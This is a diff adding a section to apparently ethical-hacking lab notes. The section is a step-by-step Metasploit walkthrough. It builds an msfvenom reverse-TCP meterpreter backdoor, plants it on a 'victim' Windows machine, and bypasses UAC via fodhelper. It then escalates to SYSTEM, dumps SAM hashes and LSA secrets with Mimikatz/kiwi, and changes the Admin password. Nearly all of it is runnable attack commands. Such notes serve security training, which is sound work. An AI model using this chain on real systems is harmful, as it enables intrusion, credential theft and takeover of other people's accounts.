@@ -43,3 +43,52 @@ run vnc
 
 ```
 </details>
+
+<details><
+<summary>Escalate privileges to gather hashdump using Mimikatz</summary>
+
+  ```console
+  
+[linux]
+		
+	sudo su
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP] lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
+	share with victim machine
+	
+	msfconsole
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set LHOST [IP]
+	set LPORT 444
+	run
+	
+	[windows]
+	access run backdoor.exe
+	
+	[parrot]
+	sysinfo
+	getuid -> Windows11\Admin
+
+	background
+	use exploit/windows/local/bypassuac_fodhelper
+	set session 1
+	set LHOST [IP]
+	set TARGET 0
+	exploit
+	getsystem -t 1
+	getuid   --> NT AUTHORITY\SYSTEM
+	load kiwi    -->to load mimikatz.
+	help kiwi    -->to view all the kiwi commands.
+	lsa_dump_sam   ->to load NTLM Hash of all users.
+	lsa_dump_secrets -> Note: LSA secrets are used to manage a system's local security policy, and contain sesnsitive data such as User passwords, IE passwords, service 
+	account passwords, SQL 
+	passwords etc.
+	
+	password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
+	lsa_dump_sam   --> check the new hash value
+	
+	[Windows]
+	try to login -> u wont be able to but try with modified pwd, u should be able to login to machine
+
+  ```
+/details>
